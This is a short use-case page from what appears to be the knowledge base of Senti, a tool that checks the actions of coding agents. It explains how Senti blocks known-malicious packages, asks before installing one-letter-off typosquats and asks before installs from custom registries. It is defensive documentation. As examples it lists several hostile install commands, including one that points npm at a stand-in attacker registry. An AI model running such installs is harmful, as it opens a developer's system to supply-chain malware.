---
type: Use Case
title: Installing a malicious or look-alike package
description: An agent installs a typosquatted or known-malicious package, or pulls one from a URL or custom registry; Senti blocks or asks.
tags: [use-case, individual]
status: stable
generated: { by: claude-code/2.1.283, at: '2026-09-27T09:00:00Z' }
sources:
  - id: kb
    resource: /.okf (architecture, research, business sections)
    title: Senti knowledge base — implemented behaviour and test results
    author: claude-code/2.1.283
---

# Who

Developer whose agent adds dependencies on its own.

# Situation

The agent runs `pip install requestss`, `npm install reqct`, `npm install lodash@npm:evil`, or `npm install --registry=https://evil.example x`.

# What Senti does

1. Known-malicious names → **block**; one-letter-off names of popular packages → **ask** (typosquatting).
2. Aliases are resolved to the real package; installs from URLs, git or files and custom registries/indexes → **ask**.
3. `npm install` also runs the package's install scripts from `package.json`, which Senti resolves and checks.
4. Organizations can set packages to *ask*/*block* per profile.

# Features involved

Supply-chain check (offline lists), task-runner resolution, profile package policy.

# How well it is verified

**Tested** (automated).

# Limits

The offline list is a seed; it should be refreshed from advisories by the org backend.

# Related

- [decision engine](/architecture/decision-engine.md)
